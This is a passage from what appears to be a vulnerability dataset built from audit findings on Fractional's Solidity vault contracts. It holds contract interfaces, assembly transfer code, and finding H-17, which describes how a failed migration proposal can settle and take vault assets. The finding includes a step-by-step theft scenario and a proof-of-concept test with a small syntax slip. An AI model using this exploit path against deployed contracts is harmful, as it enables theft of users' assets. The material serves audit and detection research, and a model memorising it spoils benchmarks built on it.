plugins\n    bytes4[] selectors;\n    // Address for the new vault to migrate to (if buyout is succesful)\n    address newVault;\n    // Boolean status to check if the propoal is active\n    bool isCommited;\n    // Old fraction supply for a given vault\n    uint256 oldFractionSupply;\n    // New fraction supply for a given vault that has succesfully migrated\n    uint256 newFractionSupply;\n    // Boolean status to check that the fractions have already been migrated\n    bool fractionsMigrated;\n}\n\n/// @dev Interface for Migration module contract\ninterface IMigration {\n    /// @dev Emitted when someone attempts to mint more new fractions into existence\n    error NewFractionsAlreadyMinted();\n    /// @dev Emitted when someone attempts to deploy a vault after a migration has already redeployed one\n    error NewVaultAlreadyDeployed(address _newVault);\n    /// @dev Emitted when a user attempts to withdraw non existing contributions\n    error NoContributionToWithdraw();\n    /// @dev Emitted when the buyout was not initiated by a migration\n    error NotProposalBuyout();\n    /// @dev Emitted when an action is taken on a proposal id that does not exist\n    error NotProposed();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when a user attempts to settle an action before a new vault has been deployed\n    error NoVaultToMigrateTo();\n    /// @dev Emitted when an action is taken on a migration with a proposal period that has ended\n    error ProposalOver();\n    /// @dev Emitted when a migration is attempted after an unsuccessful buyout\n    error UnsuccessfulMigration();\n\n    /// @dev Event log for minting the new fractional supply for a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the new vault\n    /// @param _proposalId id of the proposal\n    /// @param _amount Amount of fractions settled\n    event FractionsMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        uint256 _amount\n    );\n    /// @dev Event log for settling a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the vault\n    /// @param _proposalId id of the proposal for the Migration\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    event VaultMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        address[] _modules,\n        address[] _plugins,\n        bytes4[] _selectors\n    );\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyout() external view returns (address payable);\n\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started);\n\n    function generateMerkleTree(address[] memory _modules)\n        external\n        view\n        returns (bytes32[] memory hashes);\n\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable;\n\n    function leave(address _vault, uint256 _proposalId) external;\n\n    function migrateFractions(address _vault, uint256 _proposalId) external;\n\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function migrationInfo(address, uint256)\n        external\n        view\n        returns (\n            uint256 startTime,\n            uint256 targetPrice,\n            uint256 totalEth,\n            uint256 totalFractions,\n            address newVault,\n            bool isCommited,\n            uint256 oldFractionSupply,\n            uint256 newFractionSupply,\n            bool fractionsMigrated\n        );\n\n    function nextId() external view returns (uint256);\n\n    function propose(\n        address _vault,\n        address[] memory _modules,\n        address[] memory _plugins,\n        bytes4[] memory _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external;\n\n    function registry() external view returns (address);\n\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] memory _mintProof\n    ) external;\n\n    function settleVault(address _vault, uint256 _proposalId) external;\n\n    function withdrawContribution(address _vault, uint256 _proposalId) external;\n}\n\n\n",
        "CodeNames": [
            "Migration.sol",
            "IMigration.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-17",
                "Location": [
                    "committed",
                    "targetPrice",
                    "settleVault"
                ],
                "Type": " Proposal which started buyout which fails is able to settle migration as if its buyout succeeded.",
                "Description": "\nIf one proposal starts a buyout which fails, and then another proposal starts a buyout which succeeds, then both of them will be commited and settleVault can be called on any of them. If it's called on the failed proposal first, then it will settle even though buyout has failed (and it can proceed to withdraw all tokens to a new vault).\n\nMalicious proposal being able to successfully migrate scenario:\n\n1.  Bob starts a malicious proposal to migrate with a low targetPrice, which immediately initiates a buyout\n2.  Buyout fails (but malicious proposal is marked as committed)\n3.  Alice starts a good proposal to migrate, which goes on to buyout which eventually succeeds to get 50%+ fractions\n4.  Alice ends the buyout\n5.  Bob immediately calls settleVault with his malicious proposal\n6.  Bob's malicious proposal settles (and he can go on to withdraw all tokens from the vault into his malicious proposal effectively stealing assets from Alice).\n\n\nAdd this code to test/Migration.t.sol\n\n    function testPanprogBugH3() public {\n    \tinitializeMigration(alice, bob, 10000, 4000, true);\n\n    \t(nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n    \t// Migrate to a vault with no permissions (just to test out migration)\n    \taddress[] memory newModules = new address[(2);\n\n    \tnewModules[0] = migration;\n    \tnewModules[1] = modules[1];\n\n    \t// Bob makes the proposal\n    \tbob.migrationModule.propose(\n    \t\tvault,\n    \t\tnewModules,\n    \t\tnftReceiverPlugins,\n    \t\tnftReceiverSelectors,\n    \t\tTOTAL_SUPPLY * 2,\n    \t\t1 ether\n    \t);\n    \t// Bob joins the proposal with 4000 fractions\n    \tbob.migrationModule.join{value: 1 ether}(vault, 1, 4000);\n\n    \t// since the target price is reached, bob starts the buyout\n    \tbob.migrationModule.commit(vault, 1);\n\n    \tvm.warp(rejectionPeriod + 1);\n\n    \t// after buyout fails, bob ends it\n    \t// note: bob's proposal is still commited even though it has failed\n    \tbob.buyoutModule.end(vault, burnProof);\n    \tbob.migrationModule.withdrawContribution(vault, 1);\n\n    \t// Alice makes a different proposal (we use bob's data for simplicity)\n    \talice.migrationModule.propose(\n    \t\tvault,\n    \t\tnewModules,\n    \t\tnftReceiverPlugins,\n    \t\tnftReceiverSelectors,\n    \t\tTOTAL_SUPPLY * 10,\n    \t\t1 ether\n    \t);\n\n    \t// Alice joins the proposal with 6000 fractions\n    \talice.migrationModule.join{value: 1 ether}(vault, 2, 6000);\n\n    \t// since the target price is reached, alice starts the buyout\n    \talice.migrationModule.commit(vault, 2);\n\n    \tvm.warp(proposalPeriod * 10);\n\n    \t// after buyout succeeds (as it has 50% of fractions), alice ends it\n    \t// note: both bob's and alice's proposals are commited at this point\n    \talice.buyoutModule.end(vault, burnProof);\n\n    \t// Now bob (whose buyout has failed) settles his proposal\n    \t// It should revert, but it succeeds\n    \tvm.expectRevert(\n    \t\tabi.encodeWithSelector(IMigration.UnsuccessfulMigration.selector)\n    \t);\n    \tbob.migrationModule.settleVault(vault, 2);\n    }\n\n",
                "Repair": "\nAdd a new storage variable for currently active proposal id. Allow calling settleVault only for active proposal id (and also only if buyout's proposer equals Migration address, otherwise there can be a different successful buyout not connected to the active proposal). Also add appropriate checks with active proposal in the other functions as well (don't allow to commit if there is an active proposal etc).\n\nFerret-san (Fractional) confirmed(https://github.com/code-423n4/2022-07-fractional-findings/issues/286)\n\nHardlyDifficult (judge) commented(https://github.com/code-423n4/2022-07-fractional-findings/issues/182#issuecomment-1212397508):\n A failed migration can settle after a successful buyout. Agree this is High risk.\n \n Selecting this submission as the primary for including a clear coded POC.\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IModule} from \"./IModule.sol\";\nimport {Permission} from \"./IVaultRegistry.sol\";\n\n/// @dev Possible states that a buyout auction may have\nenum State {\n    INACTIVE,\n    LIVE,\n    SUCCESS\n}\n\n/// @dev Auction information\nstruct Auction {\n    // Time of when buyout begins\n    uint256 startTime;\n    // Address of proposer creating buyout\n    address proposer;\n    // Enum state of the buyout auction\n    State state;\n    // Price of fractional tokens\n    uint256 fractionPrice;\n    // Balance of ether in buyout pool\n    uint256 ethBalance;\n    // Total supply recorded before a buyout started\n    uint256 lastTotalSupply;\n}\n\n/// @dev Interface for Buyout module contract\ninterface IBuyout is IModule {\n    /// @dev Emitted when the payment amount does not equal the fractional price\n    error InvalidPayment();\n    /// @dev Emitted when the buyout state is invalid\n    error InvalidState(State _required, State _current);\n    /// @dev Emitted when the caller has no balance of fractional tokens\n    error NoFractions();\n    /// @dev Emitted when the caller is not the winner of an auction\n    error NotWinner();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when the time has expired for selling and buying fractions\n    error TimeExpired(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when the buyout auction is still active\n    error TimeNotElapsed(uint256 _current, uint256 _deadline);\n    /// @dev Emitted when ether deposit amount for starting a buyout is zero\n    error ZeroDeposit();\n\n    /// @dev Event log for starting a buyout\n    /// @param _vault Address of the vault\n    /// @param _proposer Address that created the buyout\n    /// @param _startTime Timestamp of when buyout was created\n    /// @param _buyoutPrice Price of buyout pool in ether\n    /// @param _fractionPrice Price of fractional tokens\n    event Start(\n        address indexed _vault,\n        address indexed _proposer,\n        uint256 _startTime,\n        uint256 _buyoutPrice,\n        uint256 _fractionPrice\n    );\n    /// @dev Event log for selling fractional tokens into the buyout pool\n    /// @param _seller Address selling fractions\n    /// @param _amount Transfer amount being sold\n    event SellFractions(address indexed _seller, uint256 _amount);\n    /// @dev Event log for buying fractional tokens from the buyout pool\n    /// @param _buyer Address buying fractions\n    /// @param _amount Transfer amount being bought\n    event BuyFractions(address indexed _buyer, uint256 _amount);\n    /// @dev Event log for ending an active buyout\n    /// @param _vault Address of the vault\n    /// @param _state Enum state of auction\n    /// @param _proposer Address that created the buyout\n    event End(address _vault, State _state, address indexed _proposer);\n    /// @dev Event log for cashing out ether for fractions from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _casher Address cashing out of buyout\n    /// @param _amount Transfer amount of ether\n    event Cash(address _vault, address indexed _casher, uint256 _amount);\n    /// @dev Event log for redeeming the underlying vault assets from an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _redeemer Address redeeming underlying assets\n    event Redeem(address _vault, address indexed _redeemer);\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function REJECTION_PERIOD() external view returns (uint256);\n\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] memory _ids,\n        uint256[] memory _values,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyFractions(address _vault, uint256 _amount) external payable;\n\n    function buyoutInfo(address)\n        external\n        view\n        returns (\n            uint256 startTime,\n            address proposer,\n            State state,\n            uint256 fractionPrice,\n            uint256 ethBalance,\n            uint256 lastTotalSupply\n        );\n\n    function cash(address _vault, bytes32[] memory _burnProof) external;\n\n    function end(address _vault, bytes32[] memory _burnProof) external;\n\n    function getLeafNodes() external view returns (bytes32[] memory nodes);\n\n    function getPermissions()\n        external\n        view\n        returns (Permission[] memory permissions);\n\n    function redeem(address _vault, bytes32[] memory _burnProof) external;\n\n    function registry() external view returns (address);\n\n    function sellFractions(address _vault, uint256 _amount) external;\n\n    function start(address _vault) external payable;\n\n    function supply() external view returns (address);\n\n    function transfer() external view returns (address);\n\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] memory _erc1155TransferProof\n    ) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IERC20} from \"../interfaces/IERC20.sol\";\nimport {IERC721} from \"../interfaces/IERC721.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {ITransfer} from \"../interfaces/ITransfer.sol\";\nimport \"../constants/Transfer.sol\";\n\n/// @title Transfer\n/// @author Fractional Art\n/// @notice Target contract for transferring fungible and non-fungible tokens\ncontract Transfer is ITransfer {\n    /// @notice Transfers an ERC-20 token\n    /// @param _token Address of the token\n    /// @param _to Target address\n    /// @param _amount Transfer amount\n    function ERC20Transfer(\n        address _token,\n        address _to,\n        uint256 _amount\n    ) external {\n        // Utilize assembly to perform an optimized ERC20 token transfer.\n        assembly {\n            // Write calldata to the free memory pointer, but restore it later.\n            let memPointer := mload(FREE_MEMORY_POINTER_SLOT)\n\n            // Write calldata into memory, starting with function selector.\n            mstore(ERC20_TRANSFER_SIG_PTR, ERC20_TRANSFER_SIGNATURE)\n            mstore(ERC20_TRANSFER_TO_PTR, _to) // Append the \"_to\" argument.\n            mstore(ERC20_TRANSFER_AMOUNT_PTR, _amount) // Append the \"_amount\" argument.\n\n            // Make call & copy up to 32 bytes of return data to scratch space.\n            // Scratch space does not need to be cleared ahead of time, as the\n            // subsequent check will ensure that either at least a full word of\n            // return data is received (in which case it will be overwritten) or\n            // that no data is received (in which case scratch space will be\n            // ignored) on a successful call to the given token.\n            let callStatus := call(\n                gas(),\n                _token,\n                0,\n                ERC20_TRANSFER_SIG_PTR,\n                ERC20_TRANSFER_LENGTH,\n                0,\n                ONE_WORD\n            )\n\n            // Determine whether transfer was successful using status & result.\n            let success := and(\n                // Set success to whether the call reverted, if not check it\n                // either returned exactly 1 (can't just be non-zero data), or\n                // had no return data.\n                or(\n                    and(eq(mload(0), 1), gt(returndatasize(), 31)),\n                    iszero(returndatasize())\n                ),\n                callStatus\n            )\n\n            // If the transfer failed or it returned nothing:\n            // Group these because they should be uncommon.\n            // Equivalent to `or(iszero(success), iszero(returndatasize()))`\n            // but after it's inverted for JUMPI this expression is cheaper.\n            if iszero(and(success, iszero(iszero(returndatasize())))) {\n                // If the token has no code or the transfer failed:\n                // Equivalent to `or(iszero(success), iszero(extcodesize(token)))`\n                // but after it's inverted for JUMPI this expression is cheaper.\n                if iszero(and(iszero(iszero(extcodesize(_token))), success)) {\n                    if iszero(success) {\n                        // If it was due to a revert:\n                        if iszero(callStatus) {\n                            // If it returned a message, bubble it up as long as\n                            // sufficient gas remains to do so:\n                            if returndatasize() {\n                                // Ensure that sufficient gas is available to\n                                // copy returndata while expanding memory where\n                                // necessary. Start by computing the word size\n                                // of returndata and allocated memory.\n                                let returnDataWords := div(\n                                    add(returndatasize(), ALMOST_ONE_WORD),\n                                    ONE_WORD\n                                )\n\n                                // Note: use the free memory pointer in place of\n                                // msize() to work around a Yul warning that\n                                // prevents accessing msize directly when the IR\n                                // pipeline is activated.\n                                let msizeWords := div(memPointer, ONE_WORD)\n\n                                // Next, compute the cost of the returndatacopy.\n                                let cost := mul(COST_PER_WORD, returnDataWords)\n\n                                // Then, compute cost of new memory allocation.\n                                if gt(returnDataWords, msizeWords) {\n                                    cost := add(\n                                        cost,\n                                        add(\n                                            mul(\n                                                sub(\n                                                    returnDataWords,\n                                                    msizeWords\n                                                ),\n                                                COST_PER_WORD\n                                            ),\n                                            div(\n                                                sub(\n                                                    mul(\n                                                        returnDataWords,\n                                                        returnDataWords\n                                                    ),\n                                                    mul(msizeWords, msizeWords)\n                                                ),\n                                                MEMORY_EXPANSION_COEFFICIENT\n                                            )\n                                        )\n                                    )\n                                }\n\n                                // Finally, add a small constant and compare to\n                                // gas remaining; bubble up the revert data if\n                                // enough gas is still available.\n                                if lt(add(cost, EXTRA_GAS_BUFFER), gas()) {\n                                    // Copy returndata to memory; overwrite\n                                    // existing memory.\n                                    returndatacopy(0, 0, returndatasize())\n\n                                    // Revert, specifying memory region with\n                                    // copied returndata.\n                                    revert(0, returndatasize())\n                                }\n                            }\n\n                            // Otherwise revert with a generic error message.\n                            mstore(\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR,\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIGNATURE\n                            )\n                            mstore(\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TOKEN_PTR,\n                                _token\n                            )\n                            // replace \"from\" argument with msg.sender\n                            mstore(\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_FROM_PTR,\n                                caller()\n                            )\n                            mstore(\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TO_PTR,\n                                _to\n                            )\n                            mstore(\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_ID_PTR,\n                                0\n                            )\n                            mstore(\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_AMOUNT_PTR,\n                                _amount\n                            )\n                            revert(\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR,\n                                TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_LENGTH\n                            )\n                        }\n\n                        // Otherwise revert with a message about the token\n                        // returning false.\n                        mstore(\n                            BAD_RETURN_VALUE_FROM_ERC20_ON_TRANSFER_ERROR_SIG_PTR,\n                            BAD_RETURN_VALUE_FROM_ERC20_ON_TRANSFER_ERROR_SIGNATURE\n                        )\n                        mstore(\n                            BAD_RETURN_VALUE_FROM_ERC20_ON_TRANSFER_ERROR_TOKEN_PTR,\n                            _token\n                        )\n                        // replace \"from\" argument with msg.sender\n                        mstore(\n                            BAD_RETURN_VALUE_FROM_ERC20_ON_TRANSFER_ERROR_FROM_PTR,\n                            caller()\n                        )\n                        mstore(\n                            BAD_RETURN_VALUE_FROM_ERC20_ON_TRANSFER_ERROR_TO_PTR,\n                            _to\n                        )\n                        mstore(\n                            BAD_RETURN_VALUE_FROM_ERC20_ON_TRANSFER_ERROR_AMOUNT_PTR,\n                            _amount\n                        )\n                        revert(\n                            BAD_RETURN_VALUE_FROM_ERC20_ON_TRANSFER_ERROR_SIG_PTR,\n                            BAD_RETURN_VALUE_FROM_ERC20_ON_TRANSFER_ERROR_LENGTH\n                        )\n                    }\n\n                    // Otherwise revert with error about token not having code:\n                    mstore(\n                        NO_CONTRACT_ERROR_SIG_PTR,\n                        NO_CONTRACT_ERROR_SIGNATURE\n                    )\n                    mstore(NO_CONTRACT_ERROR_TOKEN_PTR, _token)\n                    revert(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_LENGTH)\n                }\n\n                // Otherwise the token just returned nothing but otherwise\n                // succeeded; no need to optimize for this as it's not\n                // technically ERC20 compliant.\n            }\n\n            // Restore the original free memory pointer.\n            mstore(FREE_MEMORY_POINTER_SLOT, memPointer)\n\n            // Restore the zero slot to zero.\n            mstore(ZERO_SLOT, 0)\n        }\n    }\n\n    /// @notice Transfers an ERC-721 token\n    /// @param _token Address of the token\n    /// @param _from Source address\n    /// @param _to Target address\n    /// @param _tokenId ID of the token\n    function ERC721TransferFrom(\n        address _token,\n        address _from,\n        address _to,\n        uint256 _tokenId\n    ) external {\n        // Utilize assembly to perform an optimized ERC721 token transfer.\n        assembly {\n            // If the token has no code, revert.\n            if iszero(extcodesize(_token)) {\n                mstore(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_SIGNATURE)\n                mstore(NO_CONTRACT_ERROR_TOKEN_PTR, _token)\n                revert(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_LENGTH)\n            }\n\n            // Write calldata to free memory pointer (restore it later).\n            let memPointer := mload(FREE_MEMORY_POINTER_SLOT)\n\n            // Write calldata to memory starting with function selector.\n            mstore(ERC721_TRANSFER_SIG_PTR, ERC721_TRANSFER_FROM_SIGNATURE)\n            mstore(ERC721_TRANSFER_FROM_PTR, _from)\n            mstore(ERC721_TRANSFER_TO_PTR, _to)\n            mstore(ERC721_TRANSFER_ID_PTR, _tokenId)\n\n            // Perform the call, ignoring return data.\n            let success := call(\n                gas(),\n                _token,\n                0,\n                ERC721_TRANSFER_SIG_PTR,\n                ERC721_TRANSFER_LENGTH,\n                0,\n                0\n            )\n\n            // If the transfer reverted:\n            if iszero(success) {\n                // If it returned a message, bubble it up as long as sufficient\n                // gas remains to do so:\n                if returndatasize() {\n                    // Ensure that sufficient gas is available to copy\n                    // returndata while expanding memory where necessary. Start\n                    // by computing word size of returndata & allocated memory.\n                    // Round up to the nearest full word.\n                    let returnDataWords := div(\n                        add(returndatasize(), ALMOST_ONE_WORD),\n                        ONE_WORD\n                    )\n\n                    // Note: use the free memory pointer in place of msize() to\n                    // work around a Yul warning that prevents accessing msize\n                    // directly when the IR pipeline is activated.\n                    let msizeWords := div(memPointer, ONE_WORD)\n\n                    // Next, compute the cost of the returndatacopy.\n                    let cost := mul(COST_PER_WORD, returnDataWords)\n\n                    // Then, compute cost of new memory allocation.\n                    if gt(returnDataWords, msizeWords) {\n                        cost := add(\n                            cost,\n                            add(\n                                mul(\n                                    sub(returnDataWords, msizeWords),\n                                    COST_PER_WORD\n                                ),\n                                div(\n                                    sub(\n                                        mul(returnDataWords, returnDataWords),\n                                        mul(msizeWords, msizeWords)\n                                    ),\n                                    MEMORY_EXPANSION_COEFFICIENT\n                                )\n                            )\n                        )\n                    }\n\n                    // Finally, add a small constant and compare to gas\n                    // remaining; bubble up the revert data if enough gas is\n                    // still available.\n                    if lt(add(cost, EXTRA_GAS_BUFFER), gas()) {\n                        // Copy returndata to memory; overwrite existing memory.\n                        returndatacopy(0, 0, returndatasize())\n\n                        // Revert, giving memory region with copied returndata.\n                        revert(0, returndatasize())\n                    }\n                }\n\n                // Otherwise revert with a generic error message.\n                mstore(\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR,\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIGNATURE\n                )\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TOKEN_PTR, _token)\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_FROM_PTR, _from)\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TO_PTR, _to)\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_ID_PTR, _tokenId)\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_AMOUNT_PTR, 1)\n                revert(\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR,\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_LENGTH\n                )\n            }\n\n            // Restore the original free memory pointer.\n            mstore(FREE_MEMORY_POINTER_SLOT, memPointer)\n\n            // Restore the zero slot to zero.\n            mstore(ZERO_SLOT, 0)\n        }\n    }\n\n    /// @notice Transfers an ERC-1155 token\n    /// @param _token token to transfer\n    /// @param _from Source address\n    /// @param _to Target address\n    /// @param _tokenId ID of the token type\n    /// @param _amount Transfer amount\n    function ERC1155TransferFrom(\n        address _token,\n        address _from,\n        address _to,\n        uint256 _tokenId,\n        uint256 _amount\n    ) external {\n        // Utilize assembly to perform an optimized ERC1155 token transfer.\n        assembly {\n            // If the token has no code, revert.\n            if iszero(extcodesize(_token)) {\n                mstore(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_SIGNATURE)\n                mstore(NO_CONTRACT_ERROR_TOKEN_PTR, _token)\n                revert(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_LENGTH)\n            }\n\n            // Write calldata to these slots below, but restore them later.\n            let memPointer := mload(FREE_MEMORY_POINTER_SLOT)\n            let slot0x80 := mload(SLOT0x80)\n            let slot0xA0 := mload(SLOT0xA0)\n            let slot0xC0 := mload(SLOT0xC0)\n\n            // Write calldata into memory, beginning with function selector.\n            mstore(\n                ERC1155_SAFE_TRANSFER_SIG_PTR,\n                ERC1155_SAFE_TRANSFER_FROM_signature\n            )\n            mstore(ERC1155_SAFE_TRANSFER_FROM_PTR, _from)\n            mstore(ERC1155_SAFE_TRANSFER_TO_PTR, _to)\n            mstore(ERC1155_SAFE_TRANSFER_ID_PTR, _tokenId)\n            mstore(ERC1155_SAFE_TRANSFER_AMOUNT_PTR, _amount)\n            mstore(\n                ERC1155_SAFE_TRANSFER_DATA_OFFSET_PTR,\n                ERC1155_SAFE_TRANSFER_DATA_LENGTH_OFFSET\n            )\n            mstore(ERC1155_SAFE_TRANSFER_DATA_LENGTH_PTR, 0)\n\n            let success := call(\n                gas(),\n                _token,\n                0,\n                ERC1155_SAFE_TRANSFER_SIG_PTR,\n                ERC1155_SAFE_TRANSFER_LENGTH,\n                0,\n                0\n            )\n\n            // If the transfer reverted:\n            if iszero(success) {\n                // If it returned a message, bubble it up as long as sufficient\n                // gas remains to do so:\n                if returndatasize() {\n                    // Ensure that sufficient gas is available to copy\n                    // returndata while expanding memory where necessary. Start\n                    // by computing word size of returndata & allocated memory.\n                    // Round up to the nearest full word.\n                    let returnDataWords := div(\n                        add(returndatasize(), ALMOST_ONE_WORD),\n                        ONE_WORD\n                    )\n\n                    // Note: use the free memory pointer in place of msize() to\n                    // work around a Yul warning that prevents accessing msize\n                    // directly when the IR pipeline is activated.\n                    let msizeWords := div(memPointer, ONE_WORD)\n\n                    // Next, compute the cost of the returndatacopy.\n                    let cost := mul(COST_PER_WORD, returnDataWords)\n\n                    // Then, compute cost of new memory allocation.\n                    if gt(returnDataWords, msizeWords) {\n                        cost := add(\n                            cost,\n                            add(\n                                mul(\n                                    sub(returnDataWords, msizeWords),\n                                    COST_PER_WORD\n                                ),\n                                div(\n                                    sub(\n                                        mul(returnDataWords, returnDataWords),\n                                        mul(msizeWords, msizeWords)\n                                    ),\n                                    MEMORY_EXPANSION_COEFFICIENT\n                                )\n                            )\n                        )\n                    }\n\n                    // Finally, add a small constant and compare to gas\n                    // remaining; bubble up the revert data if enough gas is\n                    // still available.\n                    if lt(add(cost, EXTRA_GAS_BUFFER), gas()) {\n                        // Copy returndata to memory; overwrite existing memory.\n                        returndatacopy(0, 0, returndatasize())\n\n                        // Revert, giving memory region with copied returndata.\n                        revert(0, returndatasize())\n                    }\n                }\n\n                // Otherwise revert with a generic error message.\n                mstore(\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR,\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIGNATURE\n                )\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TOKEN_PTR, _token)\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_FROM_PTR, _from)\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_TO_PTR, _to)\n                mstore(TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_ID_PTR, _tokenId)\n                mstore(\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_AMOUNT_PTR,\n                    _amount\n                )\n                revert(\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_SIG_PTR,\n                    TOKEN_TRANSFER_GENERTIC_FAILURE_ERROR_LENGTH\n                )\n            }\n\n            mstore(SLOT0x80, slot0x80) // Restore slot 0x80.\n            mstore(SLOT0xA0, slot0xA0) // Restore slot 0xA0.\n            mstore(SLOT0xC0, slot0xC0) // Restore slot 0xC0.\n\n            // Restore the original free memory pointer.\n            mstore(FREE_MEMORY_POINTER_SLOT, memPointer)\n\n            // Restore the zero slot to zero.\n            mstore(ZERO_SLOT, 0)\n        }\n    }\n\n    /// @notice Batch transfers multiple ERC-1155 tokens\n    function ERC1155BatchTransferFrom(\n        address, /*_token*/\n        address, /*_from*/\n        address, /*_to*/\n        uint256[] calldata, /*_ids*/\n        uint256[] calldata /*_amounts*/\n    ) external {\n        // Utilize assembly to perform an optimized ERC1155 batch transfer.\n        assembly {\n            // Write the function selector\n            // safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)\n            mstore(\n                ERC1155_BATCH_TRANSFER_FROM_OFFSET,\n                ERC1155_SAFE_BATCH_TRANSFER_FROM_SIGNATURE\n            )\n\n            // Retrieve the token from calldata.\n            let token := calldataload(EIGHT_BYTES)\n\n            // If the token has no code, revert.\n            if iszero(extcodesize(token)) {\n                mstore(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_SIGNATURE)\n                mstore(NO_CONTRACT_ERROR_TOKEN_PTR, token)\n                revert(NO_CONTRACT_ERROR_SIG_PTR, NO_CONTRACT_ERROR_LENGTH)\n            }\n\n            // Get the total number of supplied ids.\n            let idsLength := calldataload(\n                add(EIGHT_BYTES, ERC1155_BATCH_TRANSFER_IDS_LENGTH_OFFSET)\n            )\n\n            // Determine the expected offset for the amounts array.\n            let expectedAmountsOffset := add(\n                ERC1155_BATCH_TRANSFER_AMOUNTS_LENGTH_BASE_OFFSET,\n                mul(idsLength, ONE_WORD)\n            )\n\n            // Validate struct encoding.\n            let invalidEncoding := iszero(\n                and(\n                    // ids.length == amounts.length\n                    eq(\n                        idsLength,\n                        calldataload(add(EIGHT_BYTES, expectedAmountsOffset))\n                    ),\n                    and(\n                        // ids_offset == 0xa0\n                        eq(\n                            calldataload(\n                                add(\n                                    EIGHT_BYTES,\n                                    ERC1155_BATCH_TRANSFER_IDS_HEAD_OFFSET\n                                )\n                            ),\n                            ERC1155_BATCH_TRANSFER_IDS_LENGTH_OFFSET\n                        ),\n                        // amounts_offset == 0xc0 + ids.length*32\n                        eq(\n                            calldataload(\n                                add(\n                                    EIGHT_BYTES,\n                                    ERC1155_BATCH_TRANSFER_AMOUNTS_HEAD_OFFSET\n                                )\n                            ),\n                            expectedAmountsOffset\n                        )\n                    )\n                )\n            )\n\n            // Revert with an error if the encoding is not valid.\n            if invalidEncoding {\n                mstore(\n                    INVALID_1155_BATCH_TRANSFER_ENCODING_PTR,\n                    